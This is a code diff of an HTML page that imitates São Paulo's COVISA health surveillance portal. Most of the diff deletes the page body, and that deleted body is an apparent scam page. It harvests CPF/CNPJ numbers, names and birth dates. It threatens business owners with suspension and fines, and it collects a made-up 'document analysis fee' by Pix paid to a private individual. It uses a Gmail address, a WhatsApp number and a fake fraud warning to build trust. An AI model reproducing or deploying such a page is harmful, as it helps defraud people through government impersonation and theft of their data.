@@ -163,10 +163,11 @@
     .steps-list li i { position: absolute; left: 0; top: 3px; color: var(--sp-red); font-size: 1.1rem; }
 
     .checklist-form-container { flex: 1.2; min-width: 350px; background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; }
-    .form-tabs { margin-bottom: 30px; }
+    
+    .form-tabs { display: flex; gap: 10px; margin-bottom: 30px; background: #f1f5f9; padding: 6px; border-radius: 12px; }
     #area-envio, #area-pagamento { animation: fadeIn 0.4s ease; }
     @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-    .form-tabs { display: flex; gap: 10px; background: #f1f5f9; padding: 6px; border-radius: 12px; }
+    
     .form-tab { flex: 1; text-align: center; padding: 12px; font-weight: 800; font-size: 0.9rem; color: #64748b; cursor: pointer; border-radius: 8px; transition: 0.3s; }
     .form-tab.active { background: #fff; color: var(--gov-blue); box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
 
@@ -381,523 +382,13 @@
       .selos-container { flex-direction: column; gap: 15px !important; }
       .selos-container a { width: 100% !important; max-width: 250px; margin: 0 auto; }
     }
-  </style>
-</head>
 
-<body>
-  <!-- CUSTOM ALERT MODAL -->
-  <div class="custom-alert-overlay" id="customAlertModal">
-    <div class="custom-alert-box">
-      <div class="custom-alert-icon"><i class="fas fa-exclamation-triangle"></i></div>
-      <h3 style="color: var(--warning);">ATENÇÃO: Análise Documental</h3>
-      <p><strong>Não se preocupe se faltar algum documento!</strong><br><br>Você <strong>NÃO</strong> precisa enviar tudo agora. Selecione apenas os documentos que você já tem em mãos para darmos andamento ao seu processo sem atrasos.</p>
-      <button class="btn-alert-ok" onclick="document.getElementById('customAlertModal').style.display='none'">ENTENDI, CONTINUAR</button>
-    </div>
-  </div>
-
-  <!-- NOVO MODAL DE SUCESSO (ENVIO COMPROVANTE WHATSAPP) -->
-  <div class="custom-alert-overlay" id="successSubmitModal">
-    <div class="custom-alert-box" style="border-top-color: var(--success-color);">
-      <div class="custom-alert-icon" style="color: var(--success-color); background: #dcfce3;"><i class="fas fa-check-circle"></i></div>
-      <h3>Protocolo Recebido!</h3>
-      <p style="font-size: 1rem; color: #444;">Seus documentos foram enviados para análise técnica.<br><br><strong>ATENÇÃO:</strong> É altamente recomendado que você envie o comprovante deste protocolo para o nosso WhatsApp oficial para acelerar o processo.</p>
-      <button class="btn-success" id="btn-whats-comprovante" style="margin-bottom: 10px; width: 100%;"><i class="fab fa-whatsapp"></i> ENVIAR COMPROVANTE</button>
-      <button class="btn-alert-ok" style="background: #94a3b8; width: 100%;" onclick="document.getElementById('successSubmitModal').style.display='none'">FECHAR AVISO</button>
-    </div>
-  </div>
-
-  <div class="access-widget">
-    <a href="#" title="Acessibilidade"><i class="fab fa-accessible-icon"></i></a>
-    <a href="#" title="Libras"><i class="fas fa-sign-language"></i></a>
-  </div>
-
-  <div class="security-bar">
-    <i class="fas fa-lock"></i> Ambiente Seguro | Criptografia SSL de 256 bits
-  </div>
-
-  <div class="gov-bar">
-    <div class="container flex-between">
-      <span class="gov-left">Prefeitura do Município de São Paulo</span>
-      <div class="gov-links">
-        <a href="#">Acessibilidade</a>
-        <a href="#">Alto Contraste</a>
-      </div>
-    </div>
-  </div>
-
-  <div class="drawer-overlay" id="drawerOverlay" onclick="window.closeDrawer()"></div>
-  <aside class="drawer" id="drawer">
-    <div class="drawer-top">
-      <div class="drawer-title">Menu</div>
-      <button class="drawer-close" onclick="window.closeDrawer()" aria-label="Fechar menu"><i class="fas fa-times"></i></button>
-    </div>
-    <nav class="drawer-nav">
-      <a href="#inicio" onclick="window.closeDrawer()"><i class="fas fa-chart-line"></i> Painel</a>
-      <a href="#regularize" onclick="window.closeDrawer()"><i class="fas fa-clipboard-check"></i> Regularize-se</a>
-      <a href="#legislacao" onclick="window.closeDrawer()"><i class="fas fa-gavel"></i> Legislação</a>
-      <a href="#formularios" onclick="window.closeDrawer()"><i class="fas fa-file-lines"></i> Formulários</a>
-      <a href="#noticias" onclick="window.closeDrawer()"><i class="fas fa-newspaper"></i> Notícias</a>
-      <a class="denuncia" href="#contato" onclick="window.closeDrawer()"><i class="fas fa-triangle-exclamation"></i> Denúncia <strong>Destaque</strong></a>
-    </nav>
-  </aside>
-
-  <header>
-    <div class="container header-grid">
-      <a class="brand" onclick="window.acessoAdmin()">
-        <img src="imagens/5.png" alt="Brasão SP" />
-        <div class="brand-text">
-          <h1>COVISA</h1>
-          <span>Vigilância em Saúde</span>
-        </div>
-      </a>
-
-      <nav>
-        <ul>
-          <li><a href="#inicio" class="active">Painel</a></li>
-          <li><a href="#regularize">Regularize-se</a></li>
-          <li><a href="#legislacao">Legislação</a></li>
-          <li><a href="#formularios">Formulários</a></li>
-          <li><a href="#noticias">Notícias</a></li>
-          <li><a href="#contato">Denúncia</a></li>
-        </ul>
-      </nav>
-
-      <div class="header-actions">
-        <a href="https://sso.acesso.gov.br/" target="_blank" class="btn-login"><i class="fas fa-user-circle"></i> Entrar com gov.br</a>
-      </div>
-      <button class="hamburger-btn" onclick="window.openDrawer()" aria-label="Abrir menu"><i class="fas fa-bars"></i></button>
-    </div>
-  </header>
-
-  <section id="inicio" class="hero">
-    <div class="container hero-content">
-      <span class="hero-badge">● Monitoramento Online 2026</span>
-      <h2>Gestão Integrada de<br />Vigilância e Saúde.</h2>
-      <p>Fiscalização ativa, controle de riscos e segurança sanitária.</p>
-
-      <div class="search-box">
-        <input type="text" id="main-search-input" placeholder="Consulte a situação do seu CNPJ ou CPF..." onkeypress="if(event.key === 'Enter') window.consultarDocumentoTopo()" oninput="window.maskCPFinCNPJ(this)" maxlength="18" />
-        <button onclick="window.consultarDocumentoTopo()" id="main-search-btn"><i class="fas fa-search"></i> Verificar</button>
-      </div>
-
-      <div id="search-result-area" style="display:none; background: rgba(255,255,255,0.95); padding: 20px; border-radius: 12px; margin-top: 15px; text-align: left; border: 1px solid rgba(255,255,255,0.2); max-width: 600px; margin-left: auto; margin-right: auto; position: relative; z-index: 10; color: #333; box-shadow: 0 10px 30px rgba(0,0,0,0.2);"></div>
-
-      <div style="background: white; border-radius: 12px; padding: 12px 18px; max-width: 550px; margin: 25px auto 10px; cursor: pointer; display: flex; align-items: center; gap: 15px; border-left: 5px solid var(--sp-red); box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: transform 0.2s;" onclick="document.getElementById('modal-alerta').style.display='flex'" onmouseover="this.style.transform='scale(1.02)'" onmouseout="this.style.transform='scale(1)'">
-        <img src="imagens/alerta.jpeg" alt="Alerta" style="width: 100px; height: auto; border-radius: 6px;" />
-        <div style="text-align: left;">
-          <h4 style="color: var(--sp-red); margin: 0 0 5px 0; font-size: 1.1rem; font-weight: 900; text-transform: uppercase;">Atenção: Alerta de Fraude</h4>
-          <p style="color: #444; margin: 0; font-size: 0.9rem; font-weight: 600; line-height: 1.3;">Clique aqui para ler o comunicado oficial do CVS sobre falsas cobranças.</p>
-        </div>
-      </div>
-
-    </div>
-    <div class="live-stats-bar">
-      <div class="container live-grid">
-        <div class="live-item"><h4 id="count-fiscal">1246</h4><span>Estabelecimentos Fiscalizados</span></div>
-        <div class="live-item"><h4 id="count-multa" style="color: #ff5252;">12</h4><span>Autuações Hoje</span></div>
-        <div class="live-item"><h4 id="count-regular" style="color: #69f0ae;">64%</h4><span>Índice de Regularidade</span></div>
-      </div>
-    </div>
-  </section>
-
-  <div class="container status-bar">
-    <div class="status-grid">
-      <div class="status-card"><div class="icon-box"><i class="fas fa-clipboard-check"></i></div><div class="status-info"><h4>Licenciamento</h4><strong>Online</strong></div></div>
-      <div class="status-card"><div class="icon-box"><i class="fas fa-box-open"></i></div><div class="status-info"><h4>Apreensões</h4><strong>Ativas</strong></div></div>
-      <div class="status-card"><div class="icon-box"><i class="fas fa-hard-hat"></i></div><div class="status-info"><h4>Segurança</h4><strong>Monitorada</strong></div></div>
-      <div class="status-card"><div class="icon-box"><i class="fas fa-file-contract"></i></div><div class="status-info"><h4>Protocolos</h4><strong>Abertos</strong></div></div>
-    </div>
-  </div>
-
-  <section id="regularize" class="checklist-section">
-    <div class="container">
-      <div class="checklist-wrapper">
-        <div class="checklist-intro">
-          <h2>Regularização e<br>Análise Documental</h2>
-          <p class="lead">O processo de Regularização Sanitária garante que seu estabelecimento opere dentro das normas de saúde, promovendo segurança para seus clientes e evitando sanções legais rigorosas.</p>
-
-          <div class="process-steps" id="visual-steps-container">
-            <div class="process-step active-step" id="step-visual-1" style="border-top-color: var(--gov-blue); background: #f0f4f8;"><i class="fas fa-file-upload"></i><span>1. Enviar<br>Documentação</span></div>
-            <div class="process-step" id="step-visual-2" style="border-top-color: #e2e8f0; opacity: 0.6;"><i class="fas fa-search"></i><span>2. Análise<br>do Processo</span></div>
-            <div class="process-step" id="step-visual-3" style="border-top-color: #e2e8f0; opacity: 0.6;"><i class="fas fa-file-invoice-dollar"></i><span>3. Pagamento<br>e Alvará</span></div>
-          </div>
-
-          <div class="steps-box">
-            <h4><i class="fas fa-exclamation-triangle"></i> Atenção à Taxa de Análise de Pendências Documentais</h4>
-            <p>A <strong>Taxa de Análise de Pendências Documentais</strong> é um requisito legal obrigatório e fundamental para o destravamento e andamento do seu processo. O descumprimento dos prazos e o não pagamento da taxa sujeitam o estabelecimento a penalidades severas.</p>
-            <ul class="steps-list">
-              <li><i class="fas fa-check"></i> Garante prioridade na análise pelos fiscais de plantão.</li>
-              <li><i class="fas fa-check"></i> Evita a suspensão preventiva das atividades em até 48 horas.</li>
-              <li><i class="fas fa-check"></i> Protege o CNPJ contra multas por irregularidade administrativa.</li>
-            </ul>
-          </div>
-        </div>
-
-        <div class="checklist-form-container">
-
-          <div class="form-tabs">
-            <div class="form-tab active" id="tab-envio" onclick="window.alternarAba('envio'); window.updateVisualSteps(1);">1. Iniciar Processo</div>
-            <div class="form-tab" id="tab-pagamento" onclick="window.alternarAba('pagamento'); window.updateVisualSteps(2);">2. Consultar Andamento</div>
-          </div>
-
-          <div id="area-envio">
-            <form id="form-regularizacao">
-              <label style="font-weight: 800; display: block; margin-bottom: 5px; color: var(--gov-dark-blue); font-size: 1.1rem;">Dados Cadastrais</label>
-
-              <input type="text" class="form-control" id="cnpj_empresa" placeholder="Digite seu CPF ou CNPJ" required style="margin-bottom: 10px;" oninput="window.maskCPFinCNPJ(this)" maxlength="18" />
-
-              <div id="loading-cnpj" style="display:none; font-size: 0.8rem; color: var(--gov-blue); font-weight: bold; margin-bottom: 10px;"><i class="fas fa-spinner fa-spin"></i> Buscando dados e localização via Satélite...</div>
-
-              <div id="msg-cpf-encontrado" class="cpf-success-msg">
-                <i class="fas fa-check-circle"></i> CPF LOCALIZADO NA BASE DA RECEITA!<br>
-                <span style="font-weight: normal; font-size: 0.8rem; color: #333;">Por favor, confirme seus dados pessoais abaixo para prosseguir.</span>
-              </div>
-
-              <div id="dados-pf" style="display: none;">
-                <label style="font-weight: 800; display: block; margin-top: 10px; margin-bottom: 5px; color: #555; font-size: 0.9rem;">Nome Completo (Confirmar)</label>
-                <input type="text" class="form-control" id="nome_pf" placeholder="Digite seu Nome Completo" />
-
-                <label style="font-weight: 800; display: block; margin-top: 5px; margin-bottom: 5px; color: #555; font-size: 0.9rem;">Data de Nascimento</label>
-                <input type="text" class="form-control" id="data_nasc_pf" placeholder="DD/MM/AAAA" maxlength="10" oninput="window.maskData(this)" />
-
-                <label style="font-weight: 800; display: block; margin-top: 5px; margin-bottom: 5px; color: #555; font-size: 0.9rem;">Nome do Estabelecimento / Nome Fantasia (Opcional)</label>
-                <input type="text" class="form-control" id="nome_fantasia_pf" placeholder="Ex: Salão da Maria, Mercadinho Silva..." />
-              </div>
-
-              <div id="dados-pj" style="display: none;">
-                  <input type="text" class="form-control" id="nome_empresa" placeholder="Nome Empresarial (Razão Social) *" onblur="window.salvarRascunho()" />
-                  <input type="text" class="form-control" id="nome_fantasia" placeholder="Nome Fantasia" />
-
-                  <div id="endereco-automatico" style="display: none;">
-                      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
-                          <label style="font-weight: 800; color: #555; font-size: 0.9rem; margin: 0;">Endereço Localizado</label>
-                          <button type="button" onclick="window.destravarEndereco()" style="background: none; border: none; color: var(--gov-blue); font-weight: bold; cursor: pointer; font-size: 0.85rem; display: flex; align-items: center; gap: 5px;"><i class="fas fa-pen"></i> Editar Manualmente</button>
-                      </div>
-                      <div class="form-row">
-                          <input type="text" class="form-control" id="end_cep" placeholder="CEP" readonly style="margin-bottom: 0;" />
-                          <input type="text" class="form-control" id="end_cidade" placeholder="Município / UF" readonly style="margin-bottom: 0;" />
-                      </div>
-                      <div class="form-row">
-                          <input type="text" class="form-control" id="end_rua" placeholder="Endereço" readonly />
-                          <input type="text" class="form-control" id="end_num" placeholder="Nº" readonly />
-                      </div>
-                      <input type="text" class="form-control" id="end_bairro" placeholder="Bairro" readonly />
-
-                      <div id="map-container">
-                          <div class="map-legend">📍 Localização Exata Vinculada ao CNPJ</div>
-                          <iframe id="google-map-frame" width="100%" height="100%" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
-                      </div>
-                  </div>
-              </div>
-
-              <label style="font-weight: 800; display: block; margin-top: 15px; margin-bottom: 5px; color: var(--gov-dark-blue); font-size: 1.1rem;">Ramo de Atividade *</label>
-              <select class="form-control" id="tipo_estab" required onchange="window.mostrarChecklist()">
-                <option value="" disabled selected>Selecione a atividade principal...</option>
-                <option value="Beleza">Estética e Beleza (Salão, Unhas, Barbearia, Tatuagem)</option>
-                <option value="Alimentos">Alimentos (Restaurante, Bar, Mercado, Padaria)</option>
-                <option value="Saúde">Saúde (Clínica, Odontologia, Farmácia, Laboratório)</option>
-                <option value="Outros">Outros / Comércio Geral / Indústria</option>
-              </select>
-
-              <div id="area-checklist" style="display: none;">
-                <p style="font-weight: 900; margin-top: 25px; color: var(--gov-dark-blue); border-bottom: 2px solid #e2e8f0; padding-bottom: 10px;">📄 Inventário Documental (Marque APENAS os que JÁ POSSUI):</p>
-
-                <div class="docs-grid" id="lista-documentos">
-                </div>
-
-                <div id="risco-multa" style="padding: 15px; border-radius: 8px; font-weight: bold; margin-top: 20px; display: none;"></div>
-
-              </div>
-
-              <div style="display: flex; align-items: center; gap: 15px; margin: 20px 0;">
-                  <!-- RECAPTCHA GOOGLE OFICIAL -->
-                  <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI" style="flex: 1; display: flex; align-items: center; justify-content: flex-start; overflow: hidden;"></div>
-
-                  <a href="https://api.whatsapp.com/send?phone=5511920665012&text=Ol%C3%A1%2C%20estou%20com%20dificuldades%20para%20enviar%20o%20formul%C3%A1rio%20no%20portal." target="_blank" style="display: flex; flex-direction: column; align-items: center; justify-content: center; background: #25D366; color: white; border-radius: 4px; padding: 0 15px; text-decoration: none; font-weight: 800; font-size: 0.75rem; height: 74px; border: 1px solid #20b858; box-shadow: 0 2px 4px rgba(0,0,0,0.05); transition: opacity 0.2s;">
-                      <i class="fab fa-whatsapp" style="font-size: 1.8rem; margin-bottom: 3px;"></i>
-                      <span>Suporte</span>
-                  </a>
-              </div>
-
-              <button type="submit" class="btn-success" id="btn-enviar-whatsapp" style="display: none; margin-top: 25px;">
-                <i class="fas fa-paper-plane"></i> Enviar Formulário de Análise
-              </button>
-            </form>
-          </div>
-
-          <div id="area-pagamento" style="display: none;">
-            <div style="background: #f8fafc; padding: 25px; border-radius: 12px; border: 1px solid #e2e8f0; margin-bottom: 25px;">
-              <h4 style="color: var(--gov-dark-blue); margin-bottom: 15px;">Consultar Status do Processo</h4>
-              <p style="font-size: 0.9rem; color: #64748b; margin-bottom: 15px;">Digite o seu CPF/CNPJ para consultar o andamento da análise documental ou gerar o Pix da taxa.</p>
-
-              <form id="form-consulta">
-                <input type="text" class="form-control" id="consulta_cnpj" placeholder="Digite seu CPF ou CNPJ..." required oninput="window.maskCPFinCNPJ(this)" />
-                <button type="submit" class="btn-primary"><i class="fas fa-search"></i> Consultar</button>
-              </form>
-            </div>
-
-            <div id="barra-progresso" class="progress-container" style="display: none;">
-              <div class="progress-step" id="step-1"><i class="fas fa-file-alt"></i><span class="progress-label">Recebido</span></div>
-              <div class="progress-step" id="step-2"><i class="fas fa-search"></i><span class="progress-label">Em Análise</span></div>
-              <div class="progress-step" id="step-3"><i class="fas fa-dollar-sign"></i><span class="progress-label">Aguardando Taxa</span></div>
-              <div class="progress-step" id="step-4"><i class="fas fa-check"></i><span class="progress-label">Concluído</span></div>
-            </div>
-
-            <div id="resultado-pix" style="display: none;">
-              <div class="invoice-card">
-                <div class="invoice-header">
-                  <h4>Guia de Arrecadação Oficial</h4>
-                  <span class="badge" id="status-badge">Aguardando Pgto</span>
-                </div>
-                <div class="invoice-body">
-                  <div id="pix-protocolo"></div>
-                  <div class="invoice-value">
-                    <span id="titulo-cobranca">Valor Liberado</span>
-                    <h2 id="valor-cobrado">R$ 0,00</h2>
-                  </div>
-
-                  <div class="qr-container">
-                    <div id="cronometro-pix" style="font-size: 1.2rem; font-weight: 900; color: var(--sp-red); margin-bottom: 15px; background: #fff5f5; padding: 10px; border-radius: 8px;"></div>
-
-                    <p style="font-size: 0.9rem; color: #4a5568; margin-bottom: 15px; font-weight: 600;">Escaneie o QR Code abaixo com o aplicativo do seu banco para regularizar a situação e travar possíveis multas.</p>
-
-                    <img src="imagens/pix.jpeg" alt="QR Code Pix" style="width: 200px; height: 200px; margin: 0 auto 20px; border-radius: 8px; border: 2px solid var(--gov-blue); padding: 5px; background: #fff;" />
-
-                    <label style="font-size: 0.85rem; font-weight: 800; display: block; margin-bottom: 5px; text-align: left; color: #2d3748;">Pix Copia e Cola:</label>
-                    <div style="display: flex; gap: 8px;">
-                      <input type="text" id="pix-copia-cola" value="00020126580014br.gov.bcb.pix0136299713b0-c73d-4649-98ca-bb73764cdfe25204000053039865802BR5925GILIARD DE OLIVEIRA SANTI60085500019962070503***6304D4E0" class="form-control" style="margin-bottom: 0; font-size: 0.8rem; padding: 12px; border-color: #cbd5e0; background: #fff;" readonly />
-                      <button onclick="window.copiarPix()" style="background: var(--gov-blue); color: #fff; border: none; padding: 0 20px; border-radius: 8px; cursor: pointer; transition: 0.3s;" title="Copiar código"><i class="fas fa-copy"></i></button>
-                    </div>
-                  </div>
-
-                  <div style="background: #e6fffa; padding: 15px; border-radius: 8px; border-left: 4px solid #319795; margin-bottom: 25px;">
-                    <p style="font-size: 0.9rem; font-weight: 700; color: #2c7a7b; margin: 0; line-height: 1.5;">
-                      <i class="fas fa-shield-alt"></i> PROTEÇÃO ATIVA: Ao emitir a taxa, o sistema suspende temporariamente ações fiscais.
-                    </p>
-                  </div>
-
-                  <button onclick="window.enviarWhatsAppComprovanteConsulta()" class="btn-success">
-                    💳 Emitir Guia e Suspender Ações Fiscais Temporariamente
-                  </button>
-                </div>
-              </div>
-            </div>
-
-            <div id="mensagem-status" style="display: none; padding: 25px; border-radius: 12px; border-left: 5px solid; margin-top: 20px; text-align: center;">
-              <div id="texto-mensagem" style="font-size: 1.1rem;">Em análise técnica...</div>
-            </div>
-          </div>
-
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <section class="areas-section">
-    <div class="container">
-      <div class="areas-header"><h2>Onde a Vigilância Atua?</h2><p>Nossa fiscalização protege a saúde da população em diversas frentes essenciais.</p></div>
-      <div class="areas-grid">
-        <div class="area-card"><div class="area-icon"><i class="fas fa-utensils"></i></div><h3>Alimentos</h3><p>Fiscalização de restaurantes, mercados e indústrias para garantir segurança alimentar.</p></div>
-        <div class="area-card"><div class="area-icon"><i class="fas fa-pills"></i></div><h3>Medicamentos</h3><p>Controle de farmácias e drogarias para evitar venda de produtos irregulares.</p></div>
-        <div class="area-card"><div class="area-icon"><i class="fas fa-hospital"></i></div><h3>Saúde</h3><p>Inspeção em hospitais e clínicas para garantir esterilização e procedimentos seguros.</p></div>
-        <div class="area-card"><div class="area-icon"><i class="fas fa-paw"></i></div><h3>Zoonoses</h3><p>Controle da Dengue, vacinação antirrábica e controle de pragas urbanas.</p></div>
-        <div class="area-card"><div class="area-icon"><i class="fas fa-hard-hat"></i></div><h3>Trabalho</h3><p>Verificação de EPIs e condições de segurança em ambientes de trabalho.</p></div>
-        <div class="area-card"><div class="area-icon"><i class="fas fa-water"></i></div><h3>Ambiental</h3><p>Monitoramento da qualidade da água e solo.</p></div>
-      </div>
-    </div>
-  </section>
-
-  <section class="impact-section">
-    <div class="container">
-      <div class="impact-title"><h2>Balanço de Fiscalização 2025/2026</h2><p>Combate rigoroso a irregularidades para proteger você.</p></div>
-      <div class="stats-grid">
-        <div class="stat-item"><h3>+15.400</h3><p>Vistorias Realizadas</p></div>
-        <div class="stat-item"><h3>120 Ton</h3><p>Alimentos Apreendidos</p></div>
-        <div class="stat-item"><h3>2.100</h3><p>Interdições Cautelares</p></div>
-        <div class="stat-item"><h3>+60.000</h3><p>Produtos Retirados</p></div>
-      </div>
-    </div>
-  </section>
-
-  <section id="noticias" class="news-section">
-    <div class="container">
-      <div class="section-header"><h2>Destaques Operacionais</h2></div>
-      <div class="news-grid">
-        <div class="news-card">
-          <div class="news-img"><img src="https://images.unsplash.com/photo-1576086213369-97a306d36557?q=80&w=600&auto=format&fit=crop" alt="Dengue" /></div>
-          <div class="news-body"><span class="news-tag">Urgente</span><h3>Operação Dengue Zero: Ações em toda a capital</h3><p>Equipes realizam nebulização para eliminar focos do mosquito Aedes aegypti. Colabore!</p><a href="#" class="read-more">Ler Mais <i class="fas fa-arrow-right"></i></a></div>
-        </div>
-        <div class="news-card">
-          <div class="news-img"><img src="imagens/3.jpeg" class="card-img-top" alt="Operação de fiscalização" /></div>
-          <div class="news-body"><span class="news-tag">Fiscalização</span><h3>Blitz fecha restaurantes clandestinos no centro</h3><p>Estabelecimentos operavam sem licença, com alimentos vencidos e higiene precária.</p><a href="#" class="read-more">Ler Mais <i class="fas fa-arrow-right"></i></a></div>
-        </div>
-        <div class="news-card">
-          <div class="news-img"><img src="https://images.unsplash.com/photo-1576765608535-5f04d1e3f289?q=80&w=600&auto=format&fit=crop" alt="Vacina" /></div>
-          <div class="news-body"><span class="news-tag">Saúde</span><h3>Campanha de Multivacinação Prorrogada</h3><p>Atualize a caderneta da sua família nos postos de saúde mais próximos.</p><a href="#" class="read-more">Ler Mais <i class="fas fa-arrow-right"></i></a></div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <section id="legislacao" class="laws-section">
-    <div class="container">
-      <div class="section-header"><h2>Legislação Sanitária</h2></div>
-      <table class="law-table">
-        <thead><tr><th>Norma</th><th>Descrição</th><th>Download</th></tr></thead>
-        <tbody>
-          <tr><td>Lei 13.725</td><td>Código Sanitário do Município de São Paulo.</td><td><a href="Módulo 1 – A Vigilância Sanitária no SUS.pdf" target="_blank" class="download-btn"><i class="fas fa-file-pdf"></i></a></td></tr>
-          <tr><td>Portaria 2619</td><td>Boas Práticas para Alimentos (Temperaturas, Higiene).</td><td><a href="Módulo 1 – A Vigilância Sanitária no SUS.pdf" target="_blank" class="download-btn"><i class="fas fa-file-pdf"></i></a></td></tr>
-          <tr><td>RDC 216</td><td>Regulamento Técnico ANVISA para Serviços de Alimentação.</td><td><a href="Módulo 1 – A Vigilância Sanitária no SUS.pdf" target="_blank" class="download-btn"><i class="fas fa-file-pdf"></i></a></td></tr>
-        </tbody>
-      </table>
-    </div>
-  </section>
-
-  <section id="formularios" class="laws-section" style="border-top: none; background: #f9f9f9;">
-    <div class="container">
-      <div class="section-header"><h2>Formulários e Instruções</h2></div>
-      <table class="law-table">
-        <thead><tr><th>Documento</th><th>Descrição</th><th>Download</th></tr></thead>
-        <tbody>
-          <tr><td>Instruções de Preenchimento</td><td>Guia completo para preenchimento dos formulários sanitários.</td><td><a href="INSTRUÇÕES FORMULÁRIOS.pdf" target="_blank" class="download-btn"><i class="fas fa-file-pdf"></i></a></td></tr>
-        </tbody>
-      </table>
-    </div>
-  </section>
-
-  <section class="faq-section">
-    <div class="container">
-      <div class="section-header"><h2>Perguntas Frequentes</h2></div>
-      <div class="faq-item"><div class="faq-question">Como renovar o CMVS? <i class="fas fa-chevron-down"></i></div><div class="faq-answer"><p>A renovação deve ser solicitada 60 dias antes do vencimento via sistema online.</p></div></div>
-      <div class="faq-item"><div class="faq-question">Preciso de Responsável Técnico? <i class="fas fa-chevron-down"></i></div><div class="faq-answer"><p>Depende da atividade. Drogarias e indústrias exigem. Lanchonetes geralmente não.</p></div></div>
-      <div class="faq-item"><div class="faq-question">A denúncia é anônima? <i class="fas fa-chevron-down"></i></div><div class="faq-answer"><p>Sim, seus dados são protegidos por lei e não são revelados ao denunciado.</p></div></div>
-    </div>
-  </section>
-
-  <section id="contato" class="report-section">
-    <div class="container">
-      <div class="report-header"><h2>Central de Denúncias</h2><p>Canal oficial para comunicar irregularidades sanitárias. Sua identidade é protegida por lei e o sigilo é absoluto.</p></div>
-      <div class="report-grid">
-        <div class="report-guide">
-          <h3><i class="fas fa-info-circle"></i> Guia do Denunciante</h3>
-          <ol class="guide-steps">
-            <li>Deturpe o Problema<p>Seja específico: o que, onde e quando ocorreu.</p></li>
-            <li>Anexe Evidências<p>Apenas fotos são aceitas no sistema online.</p></li>
-            <li>Acompanhe<p>A denúncia será enviada diretamente à base de dados dos fiscais de plantão.</p></li>
-          </ol>
-          <div class="anon-badge"><i class="fas fa-user-secret"></i> Anonimato Garantido pela Lei 12.527</div>
-        </div>
-        <div class="report-form-container">
-          <form id="form-denuncia">
-            <div class="form-row">
-              <div class="input-with-icon">
-                <i class="fas fa-exclamation-triangle"></i>
-                <select class="form-control" id="assunto" onchange="window.verificarOutros(this)" required>
-                  <option value="" disabled selected>Selecione o Motivo *</option>
-                  <option>Alimentos Vencidos/Estragados</option>
-                  <option>Falta de Higiene/Sujeira</option>
-                  <option>Foco de Dengue (Água Parada)</option>
-                  <option>Estabelecimento Clandestino</option>
-                  <option>Ruído Excessivo (PSIU)</option>
-                  <option>Pragas (Ratos/Baratas)</option>
-                  <option>Outros</option>
-                </select>
-              </div>
-            </div>
-            <input type="text" class="form-control" id="resumo_outros" placeholder="Descreva o motivo (máx 50 letras)" style="display: none;" maxlength="50" />
-
-            <div class="input-with-icon">
-              <i class="fas fa-search"></i>
-              <input type="text" class="form-control" id="cnpj_denuncia" placeholder="CNPJ do local (Opcional - Busca Automática)" oninput="window.maskCPFinCNPJ(this)" maxlength="18" />
-            </div>
-            <div id="loading-cnpj-denuncia" style="display:none; font-size: 0.8rem; color: var(--gov-blue); font-weight: bold; margin-bottom: 10px; margin-top: -10px; margin-left: 10px;"><i class="fas fa-spinner fa-spin"></i> Localizando endereço...</div>
-
-            <div class="input-with-icon">
-              <i class="fas fa-map-marker-alt"></i>
-              <input type="text" class="form-control" id="local" placeholder="Nome do estabelecimento e endereço completo *" required />
-            </div>
-
-            <div class="input-with-icon">
-              <i class="fab fa-whatsapp"></i>
-              <input type="text" class="form-control" id="whatsapp_estabelecimento" placeholder="WhatsApp do estabelecimento (Opcional)" maxlength="15" />
-            </div>
-
-            <div class="input-with-icon">
-              <i class="fas fa-pencil-alt"></i>
-              <textarea id="relato" class="form-control" rows="4" placeholder="Descreva a situação com o máximo de detalhes possível... *" maxlength="500" onkeyup="window.countChars(this)"></textarea>
-            </div>
-            <div class="char-counter"><span id="charNum">0</span>/500 caracteres</div>
-
-            <div class="file-upload-zone" style="cursor: pointer; position: relative;">
-              <i class="fas fa-camera"></i>
-              <h4>Evidências (Apenas Fotos)</h4>
-              <p>Toque para abrir a Câmera ou Galeria</p>
-              <input type="file" id="evidencia_denuncia" accept="image/*" multiple style="position: absolute; top:0; left:0; width:100%; height:100%; opacity:0; cursor:pointer;" onchange="window.mostrarQtdFotosDenuncia(this)">
-              <div id="qtd-fotos-denuncia" style="margin-top: 10px; font-weight: bold; color: var(--sp-red);"></div>
-            </div>
-
-            <div style="display: flex; align-items: center; gap: 15px; margin: 20px 0;">
-                <!-- RECAPTCHA GOOGLE OFICIAL -->
-                <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI" style="flex: 1; display: flex; align-items: center; justify-content: flex-start; overflow: hidden;"></div>
-
-                <a href="https://api.whatsapp.com/send?phone=5511920665012&text=Ol%C3%A1%2C%20estou%20com%20dificuldades%20para%20enviar%20o%20formul%C3%A1rio%20no%20portal." target="_blank" style="display: flex; flex-direction: column; align-items: center; justify-content: center; background: #25D366; color: white; border-radius: 4px; padding: 0 15px; text-decoration: none; font-weight: 800; font-size: 0.75rem; height: 74px; border: 1px solid #20b858; box-shadow: 0 2px 4px rgba(0,0,0,0.05); transition: opacity 0.2s;">
-                    <i class="fab fa-whatsapp" style="font-size: 1.8rem; margin-bottom: 3px;"></i>
-                    <span>Suporte</span>
-                </a>
-            </div>
-
-            <button type="submit" class="btn-report" id="btn-submit-denuncia">Registrar Denúncia Segura <i class="fas fa-paper-plane"></i></button>
-          </form>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <footer>
-    <div class="container">
-
-      <div style="display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 30px; margin-bottom: 40px; gap: 20px;">
-        <div>
-          <h4 style="color: white; margin-bottom: 10px; font-size: 1.1rem; border-left: none; padding-left: 0;">Secretaria Municipal da Saúde</h4>
-          <p style="margin: 0; color: #aaa; margin-bottom: 5px;">Telefone/WhatsApp: (11) 92066-5012</p>
-          <p style="margin: 0; color: #aaa;">E-mail: vigilanciasanitariaspgov1@gmail.com</p>
-        </div>
-
